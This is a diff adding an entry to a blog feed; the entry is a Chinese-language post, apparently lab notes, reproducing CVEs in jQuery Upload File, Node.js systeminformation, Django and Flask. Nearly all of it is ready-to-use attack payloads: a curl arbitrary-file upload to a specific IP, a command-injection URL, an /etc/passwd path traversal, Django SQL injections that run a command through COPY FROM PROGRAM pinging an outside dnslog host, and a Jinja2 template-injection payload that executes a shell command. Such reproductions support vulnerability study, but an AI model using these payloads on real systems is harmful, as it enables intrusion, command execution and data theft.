@@ -29,6 +29,31 @@
     
     
     <entry>
+      <title>框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</title>
+      <link href="/2022/04/23/kuang-jia-an-quan-cve-fu-xian-django-flask-node.js-jquery/"/>
+      <url>/2022/04/23/kuang-jia-an-quan-cve-fu-xian-django-flask-node.js-jquery/</url>
+      
+        <content type="html"><![CDATA[<blockquote></blockquote><ul><li><p>框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</p><hr><h5 id="JavaScript-开发框架安全-Jquery-amp-Node"><a href="#JavaScript-开发框架安全-Jquery-amp-Node" class="headerlink" title="JavaScript-开发框架安全-Jquery&amp;Node"></a>JavaScript-开发框架安全-Jquery&amp;Node</h5><pre><code>jQuery 1、cve_2018_9207  cve_2018_9208 cve_2018_9209描述: jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布。jQuery Upload File &lt;= 4.0.2 中的任意文件上传curl -F "myfile=@php.php" "http://123.58.236.76:56579/jquery-upload-file/php/upload.php"Node.js 1、cve_2021_21315Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。Systeminformation &lt; &nbsp;5.3.1git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.gitnode index.js/api/getServices?name[]=$(echo -e 'xiaodi' &gt; test.txt)2、cve_2017_14849GET：/static/../../../a/../../../../etc/passwd</code></pre><h5 id="Python-开发框架安全-Django-amp-Flask"><a href="#Python-开发框架安全-Django-amp-Flask" class="headerlink" title="Python-开发框架安全-Django&amp;Flask"></a>Python-开发框架安全-Django&amp;Flask</h5><pre><code>Django Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。1、cve_2019_14234单引号已注入成功，SQL语句报错：/admin/vuln/collection/?detail__a%27b=123创建cmd_exec：/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20调用cmd_exec执行命令：/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%202、CVE-2021-35042目录：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23版本：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23数据库名：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23Flask Jinja2 SSTIFlask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2 .?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 框架安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shmily </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>渗透常用工具地址-链接</title>
       <link href="/2022/04/19/chang-yong-gong-ju-lian-jie/"/>
       <url>/2022/04/19/chang-yong-gong-ju-lian-jie/</url>
